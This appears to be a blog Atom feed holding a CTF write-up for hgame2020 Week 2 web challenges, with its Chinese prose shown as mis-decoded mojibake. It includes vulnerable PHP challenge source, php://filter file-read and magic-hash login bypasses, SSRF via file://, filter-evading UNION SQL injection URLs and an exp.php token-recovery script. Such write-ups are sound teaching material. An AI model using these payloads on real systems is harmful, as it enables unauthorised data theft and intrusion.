<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>xianyu123&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://0clickjacking0.github.io/"/>
  <updated>2020-01-31T14:35:56.952Z</updated>
  <id>http://0clickjacking0.github.io/</id>
  
  <author>
    <name>xianyu123</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>hgame2020-Level-Week2_Web_writeup</title>
    <link href="http://0clickjacking0.github.io/2020/01/26/hgame2020-Level-Week2-Web-writeup/"/>
    <id>http://0clickjacking0.github.io/2020/01/26/hgame2020-Level-Week2-Web-writeup/</id>
    <published>2020-01-26T13:49:34.000Z</published>
    <updated>2020-01-31T14:35:56.952Z</updated>
    
    <content type="html"><![CDATA[<p>hgame2020-Level-Week2_Web_writeup</p><a id="more"></a><h2 id="Cosmosçš„åšå®¢åå°"><a href="#Cosmosçš„åšå®¢åå°" class="headerlink" title="Cosmosçš„åšå®¢åå°"></a>Cosmosçš„åšå®¢åå°</h2><p>æ‰“å¼€é¢˜ç›®ï¼Œé¦–å…ˆç”¨ä¼ªåè®®è¯»å–<code>index.php</code>ï¼Œ<code>login.php</code>ï¼Œ<code>admin.php</code></p><p><code>php://filter/convert.base64-encode/resource=index.php</code></p><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">'username'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: admin.php"</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$action = @$_GET[<span class="string">'action'</span>];</span><br><span class="line">$filter = <span class="string">"/config|etc|flag/i"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'action'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_GET[<span class="string">'action'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match($filter, $_GET[<span class="string">'action'</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Hacker get out!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span> $action;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'action'</span>]) || <span class="keyword">empty</span>($_GET[<span class="string">'action'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: ?action=login.php"</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>login.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;config.php&quot;;</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">//Only for debug</span><br><span class="line">if (DEBUG_MODE)&#123;</span><br><span class="line">    if(isset($_GET[&apos;debug&apos;])) &#123;</span><br><span class="line">        $debug = $_GET[&apos;debug&apos;];</span><br><span class="line">        if (!preg_match(&quot;/^[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*$/&quot;, $debug)) &#123;</span><br><span class="line">            die(&quot;args error!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        eval(&quot;var_dump($$debug);&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_SESSION[&apos;username&apos;])) &#123;</span><br><span class="line">    header(&quot;Location: admin.php&quot;);</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    if (isset($_POST[&apos;username&apos;]) &amp;&amp; isset($_POST[&apos;password&apos;])) &#123;</span><br><span class="line">        if ($admin_password == md5($_POST[&apos;password&apos;]) &amp;&amp; $_POST[&apos;username&apos;] === $admin_username)&#123;</span><br><span class="line">            $_SESSION[&apos;username&apos;] = $_POST[&apos;username&apos;];</span><br><span class="line">            header(&quot;Location: admin.php&quot;);</span><br><span class="line">            exit();</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            echo &quot;ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;zh-CN&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;description&quot; content=&quot;&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;author&quot; content=&quot;&quot;&gt;</span><br><span class="line">    &lt;title&gt;Cosmosçš„åšå®¢åå°&lt;/title&gt;</span><br><span class="line">    &lt;link href=&quot;static/signin.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">    &lt;link href=&quot;static/sticky-footer.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">    &lt;link href=&quot;https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class=&quot;container&quot;&gt;</span><br><span class="line">    &lt;form class=&quot;form-signin&quot; method=&quot;post&quot; action=&quot;login.php&quot;&gt;</span><br><span class="line">        &lt;h2 class=&quot;form-signin-heading&quot;&gt;åå°ç™»é™†&lt;/h2&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; name=&quot;username&quot; class=&quot;form-control&quot; placeholder=&quot;ç”¨æˆ·å&quot; required autofocus&gt;</span><br><span class="line">        &lt;input type=&quot;password&quot; name=&quot;password&quot; class=&quot;form-control&quot; placeholder=&quot;å¯†ç &quot; required&gt;</span><br><span class="line">        &lt;input class=&quot;btn btn-lg btn-primary btn-block&quot; type=&quot;submit&quot; value=&quot;Submit&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;footer class=&quot;footer&quot;&gt;</span><br><span class="line">    &lt;center&gt;</span><br><span class="line">        &lt;div class=&quot;container&quot;&gt;</span><br><span class="line">            &lt;p class=&quot;text-muted&quot;&gt;Created by Annevi&lt;/p&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/center&gt;</span><br><span class="line">&lt;/footer&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>admin.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;config.php&quot;;</span><br><span class="line">session_start();</span><br><span class="line">if(!isset($_SESSION[&apos;username&apos;])) &#123;</span><br><span class="line">    header(&apos;Location: index.php&apos;);</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function insert_img() &#123;</span><br><span class="line">    if (isset($_POST[&apos;img_url&apos;])) &#123;</span><br><span class="line">        $img_url = @$_POST[&apos;img_url&apos;];</span><br><span class="line">        $url_array = parse_url($img_url);</span><br><span class="line">        if (@$url_array[&apos;host&apos;] !== &quot;localhost&quot; &amp;&amp; $url_array[&apos;host&apos;] !== &quot;timgsa.baidu.com&quot;) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        $c = curl_init();</span><br><span class="line">        curl_setopt($c, CURLOPT_URL, $img_url);</span><br><span class="line">        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">        $res = curl_exec($c);</span><br><span class="line">        curl_close($c);</span><br><span class="line">        $avatar = base64_encode($res);</span><br><span class="line"></span><br><span class="line">        if(filter_var($img_url, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">            return $avatar;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        return base64_encode(file_get_contents(&quot;static/logo.png&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Cosmos&apos;Blog - åå°ç®¡ç†&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;a href=&quot;logout.php&quot;&gt;é€€å‡ºç™»é™†&lt;/a&gt;</span><br><span class="line">&lt;div style=&quot;text-align: center;&quot;&gt;</span><br><span class="line">    &lt;h1&gt;Welcome &lt;?php echo $_SESSION[&apos;username&apos;];?&gt; &lt;/h1&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;</span><br><span class="line">    &lt;fieldset style=&quot;width: 30%;height: 20%;float:left&quot;&gt;</span><br><span class="line">        &lt;legend&gt;æ’å…¥å›¾ç‰‡&lt;/legend&gt;</span><br><span class="line">        &lt;p&gt;&lt;label&gt;å›¾ç‰‡url: &lt;input type=&quot;text&quot; name=&quot;img_url&quot; placeholder=&quot;&quot;&gt;&lt;/label&gt;&lt;/p&gt;</span><br><span class="line">        &lt;p&gt;&lt;button type=&quot;submit&quot; name=&quot;submit&quot;&gt;æ’å…¥&lt;/button&gt;&lt;/p&gt;</span><br><span class="line">    &lt;/fieldset&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;fieldset style=&quot;width: 30%;height: 20%;float:left&quot;&gt;</span><br><span class="line">    &lt;legend&gt;è¯„è®ºç®¡ç†&lt;/legend&gt;</span><br><span class="line">    &lt;h2&gt;å¾…å¼€å‘..&lt;/h2&gt;</span><br><span class="line">&lt;/fieldset&gt;</span><br><span class="line">&lt;fieldset style=&quot;width: 30%;height: 20%;&quot;&gt;</span><br><span class="line">    &lt;legend&gt;æ–‡ç« åˆ—è¡¨&lt;/legend&gt;</span><br><span class="line">    &lt;h2&gt;å¾…å¼€å‘..&lt;/h2&gt;</span><br><span class="line">&lt;/fieldset&gt;</span><br><span class="line">&lt;fieldset style=&quot;height: 50%&quot;&gt;</span><br><span class="line">    &lt;div style=&quot;text-align: center;&quot;&gt;</span><br><span class="line">        &lt;img height=&apos;200&apos; width=&apos;500&apos; src=&apos;data:image/jpeg;base64,&lt;?php echo insert_img() ? insert_img() : base64_encode(file_get_contents(&quot;static/error.jpg&quot;)); ?&gt;&apos;&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/fieldset&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆåœ¨<code>login.php</code>ä¸­çš„<code>ç¬¬12è¡Œ</code>å­˜åœ¨ç¯å¢ƒå˜é‡çš„è¯»å–ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥è·å–åˆ°usernameå’Œmd5åŠ å¯†åçš„å¯†ç å€¼</p><p><img src="http://images.xianyu123.club/Cosmos_blog1.png" alt></p><p>æˆ‘ä»¬æ¥ç€çœ‹<code>login.php</code>çš„<code>ç¬¬22è¡Œ</code>ï¼Œè¿™é‡Œå¯†ç æ¯”è¾ƒæ˜¯å­˜åœ¨å¼±ç±»å‹ï¼Œæ‰€ä»¥å¯ä»¥ç”¨åŠ å¯†åä¹Ÿæ˜¯<code>0e</code>å¼€å¤´çš„å­—ç¬¦ä¸²å³å¯ç»•è¿‡</p><p><img src="http://images.xianyu123.club/Cosmos_blog2.png" alt></p><p>æ¥ä¸‹æ¥æˆ‘ä»¬æ¥çœ‹<code>admin.php</code>ï¼Œè¿™é‡Œhostå¿…é¡»ä¸ºlocalhostï¼Œä¸”å¯ä»¥ä½¿ç”¨ä»»ä½•åè®®ï¼Œç›´æ¥ç”¨fileåè®®è¿›è¡Œè¯»å–</p><p><img src="http://images.xianyu123.club/Cosmos_blog3.png" alt></p><p>ç„¶åè¿›è¡Œbase64è§£ç å³å¯</p><h2 id="Cosmosçš„ç•™è¨€æ¿-1"><a href="#Cosmosçš„ç•™è¨€æ¿-1" class="headerlink" title="Cosmosçš„ç•™è¨€æ¿-1"></a>Cosmosçš„ç•™è¨€æ¿-1</h2><p>é€šè¿‡fuzzåˆ¤æ–­è¿™é‡ŒæŠŠ<code>select</code>å’Œç©ºæ ¼æ›¿æ¢ä¸ºç©ºäº†</p><p><code>select</code>ç»•è¿‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://139.199.182.61/index.php?id=&apos;^(length(&apos;selselectect&apos;)=6)^&apos;</span><br></pre></td></tr></table></figure><p>ç©ºæ ¼è¿‡æ»¤ç»•è¿‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://139.199.182.61/index.php?id=&apos;^(length(&apos;%20&apos;)=1)^&apos;</span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢å­—æ®µï¼Œè¿™é‡Œåªæœ‰ä¸€ä¸ªå­—æ®µ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://139.199.182.61/index.php?id=1&apos;%0aorder%0aby%0a1%23</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹å¯æ˜¾å­—æ®µ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://139.199.182.61/index.php?id=1&apos;%0aand%0a&apos;1&apos;=&apos;2&apos;%0aunion%0aseleselectct%0a(1)%23</span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢åº“å</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://139.199.182.61/index.php?id=1&apos;%0aand%0a&apos;1&apos;=&apos;2&apos;%0aunion%0aseleselectct%0adatabase()%23</span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢è¡¨å</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://139.199.182.61/index.php?id=1&apos;%0aand%0a&apos;1&apos;=&apos;2&apos;%0aunion%0aseleselectct%0a(sselectelect%0agroup_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=database())%23</span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢å€¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://139.199.182.61/index.php?id=1&apos;%0aand%0a&apos;1&apos;=&apos;2&apos;%0aunion%0aseleselectct%0a(seleselectct%0a*%0afrom%0aeasysql.f1aggggggggggggg)%23</span><br></pre></td></tr></table></figure><h2 id="Cosmosçš„æ–°è¯­è¨€"><a href="#Cosmosçš„æ–°è¯­è¨€" class="headerlink" title="Cosmosçš„æ–°è¯­è¨€"></a>Cosmosçš„æ–°è¯­è¨€</h2><p><code>index.php</code>é¡µé¢å†…å®¹å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$code = file_get_contents(<span class="string">'mycode'</span>);</span><br><span class="line"><span class="keyword">eval</span>($code);</span><br></pre></td></tr></table></figure><p>fuzzçŒœæµ‹<code>/mycode</code>æœç„¶å­˜åœ¨ï¼Œå¦‚ä¸‹</p><p><img src="http://images.xianyu123.club/Cosmos_new_language1.png" alt></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    $result = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &amp;lt; strlen($str); $i++)&#123;</span><br><span class="line">        $result .= chr(ord($str[$i]) + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(base64_encode(encrypt(strrev(str_rot13(base64_encode(str_rot13(encrypt(strrev(strrev(base64_encode($_SERVER[<span class="string">'token'</span>])))))))))));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(@$_POST[<span class="string">'token'</span>] === $_SERVER[<span class="string">'token'</span>])&#123;</span><br><span class="line">    <span class="keyword">echo</span>($_SERVER[<span class="string">'flag'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯è§£å¯†ï¼Œè¿™é‡Œ<code>python</code>æ¶‰åŠåˆ°ç¼–ç è½¬æ¢é—®é¢˜ï¼Œæ¯”è¾ƒéº»çƒ¦ï¼Œæ‰€ä»¥æˆ‘ä½¿ç”¨<code>php</code>æ¥é€†å‘è§£å¯†ï¼Œå…³é”®é—®é¢˜æ˜¯<code>code</code>ä»£ç ä¸­çš„è§£å¯†éƒ¨åˆ†ä¼šä¸€ç›´æ”¹å˜ï¼Œæ‰€ä»¥éœ€è¦å…ˆæŠ“å–ï¼Œå…¶ä»–å°±æŒ‰ä¸€èˆ¬æ­¥éª¤æ¥å°±å¥½äº†ï¼Œä¸‹é¢æ˜¯æˆ‘çš„<code>exp</code>ã€‚æœ‰å¯èƒ½ç¬¬ä¸€æ¬¡è·‘ä¸å‡ºflagï¼Œå¤šè¿è¡Œå‡ éä»£ç å°±å¯ä»¥å‡ºflagäº†</p><p><code>exp.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//è§£å¯†å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    $result = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($str); $i++)&#123;</span><br><span class="line">        $result .= chr(ord($str[$i]) - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å‘é€postè¯·æ±‚å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">post</span><span class="params">($url, $post_data = <span class="string">''</span>, $timeout = <span class="number">5</span>)</span></span>&#123;<span class="comment">//curl</span></span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt ($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt ($ch, CURLOPT_POST, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>($post_data != <span class="string">''</span>)&#123;</span><br><span class="line">        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);</span><br><span class="line">    &#125;</span><br><span class="line">    curl_setopt ($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">    curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="keyword">false</span>);</span><br><span class="line">    $file_contents = curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">    <span class="keyword">return</span> $file_contents;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ›¿æ¢æ•°ç»„ä¸­çš„å…ƒç´ </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arrContentReplact</span><span class="params">($array)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(is_array($array))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">foreach</span>($array <span class="keyword">as</span> $k =&gt; $v)</span><br><span class="line">        &#123;</span><br><span class="line">            $array[$k] = arrContentReplact($array[$k]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        $array = str_replace(<span class="keyword">array</span>(<span class="string">''</span>, <span class="string">'encrypt'</span>,<span class="string">'base64_encode'</span>), <span class="keyword">array</span>(<span class="string">''</span>, <span class="string">'decrypt'</span>,<span class="string">'base64_decode'</span>), $array);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $array;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è·å–åŠ å¯†çš„tokenå­—ç¬¦ä¸²</span></span><br><span class="line">$text = file_get_contents(<span class="string">'http://ffddf97958.php.hgame.n3ko.co/'</span>);</span><br><span class="line">$re = <span class="string">'/&lt;\/code&gt;&lt;br&gt;(.+)&lt;br&gt;/msx'</span>;</span><br><span class="line">preg_match_all($re, $text, $matches, PREG_SET_ORDER, <span class="number">0</span>);</span><br><span class="line">$str = $matches[<span class="number">0</span>][<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//è·å–codeä»£ç ï¼Œæå–å…¶ä¸­çš„åŠ å¯†å‡½æ•°ï¼ŒåŠ å¯†å‡½æ•°ä¼šä¸€ç›´å˜</span></span><br><span class="line">$code_text = file_get_contents(<span class="string">'http://ffddf97958.php.hgame.n3ko.co/mycode'</span>);</span><br><span class="line">$re = <span class="string">'/echo\((.+)\$_SERVER.+if/msx'</span>;</span><br><span class="line">preg_match_all($re, $code_text, $matches, PREG_SET_ORDER, <span class="number">0</span>);</span><br><span class="line">$code = $matches[<span class="number">0</span>][<span class="number">1</span>];</span><br><span class="line">$payload = explode(<span class="string">'('</span>,$code);  <span class="comment">//æŠŠåŠ å¯†å‡½æ•°ä»¥(åˆ†å‰²</span></span><br><span class="line">$payload = array_filter($payload);  <span class="comment">//åˆ é™¤æ•°ç»„ä¸­çš„ç©ºå€¼</span></span><br><span class="line">$payload = arrContentReplact($payload);  <span class="comment">//è°ƒç”¨æ›¿æ¢æ•°ç»„ä¸­çš„å…ƒç´ </span></span><br><span class="line">$payload = array_reverse($payload);  <span class="comment">//æ•°ç»„ä¸­çš„å…ƒç´ é€†ç½®</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//æŠŠé€†ç½®åçš„å…ƒç´ æ‹¼æ¥èµ·æ¥</span></span><br><span class="line">$payload_str = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">foreach</span> ($payload <span class="keyword">as</span> $v)&#123;</span><br><span class="line">    $payload_str .=( $v.<span class="string">'('</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//é€†å‘è§£å‡ºtoken</span></span><br><span class="line"><span class="keyword">eval</span>((<span class="string">'$token='</span>.$payload_str.<span class="string">'$str'</span>.str_repeat(<span class="string">')'</span>,<span class="number">10</span>).<span class="string">';'</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//å‘é€postè¯·æ±‚</span></span><br><span class="line"><span class="keyword">echo</span> post(<span class="string">'http://ffddf97958.php.hgame.n3ko.co'</span>,<span class="string">'token='</span>.$token);</span><br></pre></td></tr></table></figure><h2 id="Cosmosçš„èŠå¤©å®¤"><a href="#Cosmosçš„èŠå¤©å®¤" class="headerlink" title="Cosmosçš„èŠå¤©å®¤"></a>Cosmosçš„èŠå¤©å®¤</h2><h4 id="è¿™é¢˜æ˜¯èµ›åå¤ç°çš„"><a href="#è¿™é¢˜æ˜¯èµ›åå¤ç°çš„" class="headerlink" 